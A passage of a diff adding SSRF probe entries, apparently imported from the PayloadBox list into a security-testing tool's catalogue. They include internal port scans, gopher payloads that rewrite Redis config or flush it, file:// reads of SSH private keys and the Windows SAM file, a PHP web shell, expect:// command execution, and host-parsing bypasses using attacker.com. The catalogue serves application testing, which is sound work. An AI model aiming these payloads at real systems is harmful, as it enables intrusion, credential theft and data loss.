+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:23",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0113",
+    "name": "Ssrf Injection #113",
+    "template": "http://localhost:25",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:25",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0114",
+    "name": "Ssrf Injection #114",
+    "template": "http://localhost:53",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:53",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0115",
+    "name": "Ssrf Injection #115",
+    "template": "http://localhost:110",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:110",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0116",
+    "name": "Ssrf Injection #116",
+    "template": "http://localhost:143",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:143",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0117",
+    "name": "Ssrf Injection #117",
+    "template": "http://localhost:445",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:445",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0118",
+    "name": "Ssrf Injection #118",
+    "template": "http://localhost:1433",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:1433",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0119",
+    "name": "Ssrf Injection #119",
+    "template": "http://localhost:3389",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:3389",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0120",
+    "name": "Ssrf Injection #120",
+    "template": "http://localhost:5984",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:5984",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0121",
+    "name": "Ssrf Injection #121",
+    "template": "http://localhost:9000",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:9000",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0122",
+    "name": "Ssrf Injection #122",
+    "template": "http://localhost:9200",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:9200",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0123",
+    "name": "Ssrf Injection #123",
+    "template": "http://localhost:11211",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:11211",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0124",
+    "name": "Ssrf Injection #124",
+    "template": "http://localhost:27017",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:27017",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0125",
+    "name": "Ssrf Injection #125",
+    "template": "gopher://127.0.0.1:6379/_SET%20test%20value",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://127.0.0.1:6379/_SET%20test%20value",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0126",
+    "name": "Ssrf Injection #126",
+    "template": "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0127",
+    "name": "Ssrf Injection #127",
+    "template": "gopher://localhost:6379/_FLUSHALL",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://localhost:6379/_FLUSHALL",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0128",
+    "name": "Ssrf Injection #128",
+    "template": "gopher://127.0.0.1:6379/_EVAL%20",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://127.0.0.1:6379/_EVAL%20",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0129",
+    "name": "Ssrf Injection #129",
+    "template": "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0AHost:%20localhost",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0AHost:%20localhos...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0130",
+    "name": "Ssrf Injection #130",
+    "template": "gopher://127.0.0.1:80/_POST%20/%20HTTP/1.1%0AHost:%20localhost%0AContent-Length:%200",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://127.0.0.1:80/_POST%20/%20HTTP/1.1%0AHost:%20localho...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0131",
+    "name": "Ssrf Injection #131",
+    "template": "gopher://127.0.0.1:3306/_",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://127.0.0.1:3306/_",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0132",
+    "name": "Ssrf Injection #132",
+    "template": "gopher://localhost:3306/_",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://localhost:3306/_",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0133",
+    "name": "Ssrf Injection #133",
+    "template": "gopher://127.0.0.1:25/_MAIL%20FROM:<admin@localhost>",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://127.0.0.1:25/_MAIL%20FROM:<admin@localhost>",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0134",
+    "name": "Ssrf Injection #134",
+    "template": "gopher://localhost:25/_RCPT%20TO:<victim@localhost>",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://localhost:25/_RCPT%20TO:<victim@localhost>",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0135",
+    "name": "Ssrf Injection #135",
+    "template": "gopher://127.0.0.1:9000/_",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://127.0.0.1:9000/_",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0136",
+    "name": "Ssrf Injection #136",
+    "template": "dict://localhost:11211/stat",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: dict://localhost:11211/stat",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0137",
+    "name": "Ssrf Injection #137",
+    "template": "dict://127.0.0.1:6379/info",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: dict://127.0.0.1:6379/info",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0138",
+    "name": "Ssrf Injection #138",
+    "template": "dict://localhost:6379/CONFIG",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: dict://localhost:6379/CONFIG",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0139",
+    "name": "Ssrf Injection #139",
+    "template": "ldap://localhost:389",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: ldap://localhost:389",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0140",
+    "name": "Ssrf Injection #140",
+    "template": "ldap://127.0.0.1:389/%0astats",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: ldap://127.0.0.1:389/%0astats",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0141",
+    "name": "Ssrf Injection #141",
+    "template": "ldap://localhost:389/dc=example,dc=com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: ldap://localhost:389/dc=example,dc=com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0142",
+    "name": "Ssrf Injection #142",
+    "template": "file:///etc/hostname",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///etc/hostname",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0143",
+    "name": "Ssrf Injection #143",
+    "template": "file:///etc/network/interfaces",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///etc/network/interfaces",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0144",
+    "name": "Ssrf Injection #144",
+    "template": "file:///etc/resolv.conf",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///etc/resolv.conf",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0145",
+    "name": "Ssrf Injection #145",
+    "template": "file:///root/.ssh/id_rsa",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///root/.ssh/id_rsa",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0146",
+    "name": "Ssrf Injection #146",
+    "template": "file:///root/.bash_history",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///root/.bash_history",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0147",
+    "name": "Ssrf Injection #147",
+    "template": "file:///home/user/.ssh/id_rsa",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///home/user/.ssh/id_rsa",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0148",
+    "name": "Ssrf Injection #148",
+    "template": "file:///var/www/html/index.php",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///var/www/html/index.php",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0149",
+    "name": "Ssrf Injection #149",
+    "template": "file:///proc/self/fd/0",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///proc/self/fd/0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0150",
+    "name": "Ssrf Injection #150",
+    "template": "file:///proc/net/arp",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///proc/net/arp",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0151",
+    "name": "Ssrf Injection #151",
+    "template": "file:///proc/net/route",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///proc/net/route",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0152",
+    "name": "Ssrf Injection #152",
+    "template": "file:///proc/net/tcp",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///proc/net/tcp",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0153",
+    "name": "Ssrf Injection #153",
+    "template": "file:///proc/net/udp",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///proc/net/udp",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0154",
+    "name": "Ssrf Injection #154",
+    "template": "file:///C:/windows/system.ini",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///C:/windows/system.ini",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0155",
+    "name": "Ssrf Injection #155",
+    "template": "file:///C:/boot.ini",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///C:/boot.ini",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0156",
+    "name": "Ssrf Injection #156",
+    "template": "file:///C:/inetpub/wwwroot/web.config",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///C:/inetpub/wwwroot/web.config",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0157",
+    "name": "Ssrf Injection #157",
+    "template": "file:///C:/windows/system32/config/SAM",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///C:/windows/system32/config/SAM",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0158",
+    "name": "Ssrf Injection #158",
+    "template": "file:///C:/windows/repair/SAM",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///C:/windows/repair/SAM",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0159",
+    "name": "Ssrf Injection #159",
+    "template": "file:///C:/windows/debug/NetSetup.log",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///C:/windows/debug/NetSetup.log",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0160",
+    "name": "Ssrf Injection #160",
+    "template": "jar:http://attacker.com/evil.jar!/",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: jar:http://attacker.com/evil.jar!/",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0161",
+    "name": "Ssrf Injection #161",
+    "template": "jar:file:///var/www/uploads/file.zip!/shell.php",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: jar:file:///var/www/uploads/file.zip!/shell.php",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0162",
+    "name": "Ssrf Injection #162",
+    "template": "data://text/plain,<?php system($_GET['cmd']); ?>",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: data://text/plain,<?php system($_GET['cmd']); ?>",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0163",
+    "name": "Ssrf Injection #163",
+    "template": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0164",
+    "name": "Ssrf Injection #164",
+    "template": "data:text/html,<script>alert('XSS')</script>",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: data:text/html,<script>alert('XSS')</script>",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0165",
+    "name": "Ssrf Injection #165",
+    "template": "expect://id",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: expect://id",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0166",
+    "name": "Ssrf Injection #166",
+    "template": "expect://whoami",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: expect://whoami",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0167",
+    "name": "Ssrf Injection #167",
+    "template": "expect://ls",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: expect://ls",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0168",
+    "name": "Ssrf Injection #168",
+    "template": "php://filter/convert.base64-encode/resource=/etc/passwd",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: php://filter/convert.base64-encode/resource=/etc/passwd",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0169",
+    "name": "Ssrf Injection #169",
+    "template": "php://filter/read=string.rot13/resource=/etc/passwd",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: php://filter/read=string.rot13/resource=/etc/passwd",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0170",
+    "name": "Ssrf Injection #170",
+    "template": "php://input",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: php://input",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0171",
+    "name": "Ssrf Injection #171",
+    "template": "php://stdin",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: php://stdin",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0172",
+    "name": "Ssrf Injection #172",
+    "template": "php://memory",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: php://memory",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0173",
+    "name": "Ssrf Injection #173",
+    "template": "php://temp",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: php://temp",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0174",
+    "name": "Ssrf Injection #174",
+    "template": "php://fd/3",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: php://fd/3",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0175",
+    "name": "Ssrf Injection #175",
+    "template": "phar://archive.phar/file.php",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: phar://archive.phar/file.php",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0176",
+    "name": "Ssrf Injection #176",
+    "template": "http://\u2460\u2461\u2466.\u24ea.\u24ea.\u2460",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://\u2460\u2461\u2466.\u24ea.\u24ea.\u2460",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0177",
+    "name": "Ssrf Injection #177",
+    "template": "http://127\u30020\u30020\u30021",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127\u30020\u30020\u30021",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0178",
+    "name": "Ssrf Injection #178",
+    "template": "http://127\uff610\uff610\uff611",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127\uff610\uff610\uff611",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0179",
+    "name": "Ssrf Injection #179",
+    "template": "http://127\uff0e0\uff0e0\uff0e1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127\uff0e0\uff0e0\uff0e1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0180",
+    "name": "Ssrf Injection #180",
+    "template": "http://127.0.0.1%E3%80%82nip.io",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%E3%80%82nip.io",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0181",
+    "name": "Ssrf Injection #181",
+    "template": "http://127.0.0.1%E3%80%82attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%E3%80%82attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0182",
+    "name": "Ssrf Injection #182",
+    "template": "http://127.0.0.1%EF%BC%8Eattacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%EF%BC%8Eattacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0183",
+    "name": "Ssrf Injection #183",
+    "template": "http://LocalHost",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://LocalHost",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0184",
+    "name": "Ssrf Injection #184",
+    "template": "http://LOCALHOST",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://LOCALHOST",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0185",
+    "name": "Ssrf Injection #185",
+    "template": "http://LoCaLhOsT",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://LoCaLhOsT",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0186",
+    "name": "Ssrf Injection #186",
+    "template": "http://localtest.me",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localtest.me",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0187",
+    "name": "Ssrf Injection #187",
+    "template": "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0188",
+    "name": "Ssrf Injection #188",
+    "template": "http://bugbounty.dod.network",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://bugbounty.dod.network",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0189",
+    "name": "Ssrf Injection #189",
+    "template": "http://target.com/redirect?url=http://127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://target.com/redirect?url=http://127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0190",
+    "name": "Ssrf Injection #190",
+    "template": "http://target.com/redirect?url=http://169.254.169.254",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://target.com/redirect?url=http://169.254.169.254",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0191",
+    "name": "Ssrf Injection #191",
+    "template": "http://target.com/redirect?url=file:///etc/passwd",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://target.com/redirect?url=file:///etc/passwd",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0192",
+    "name": "Ssrf Injection #192",
+    "template": "http://127.0.0.1:80%23@attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:80%23@attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0193",
+    "name": "Ssrf Injection #193",
+    "template": "http://127.0.0.1%2523@attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%2523@attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0194",
+    "name": "Ssrf Injection #194",
+    "template": "http://attacker.com%2523@127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com%2523@127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0195",
+    "name": "Ssrf Injection #195",
+    "template": "http://127.0.0.1%00",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%00",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0196",
+    "name": "Ssrf Injection #196",
+    "template": "http://localhost%00.attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost%00.attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0197",
+    "name": "Ssrf Injection #197",
+    "template": "http://127.0.0.1%0d%0a",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%0d%0a",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0198",
+    "name": "Ssrf Injection #198",
+    "template": "http://127.0.0.1%0a",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%0a",
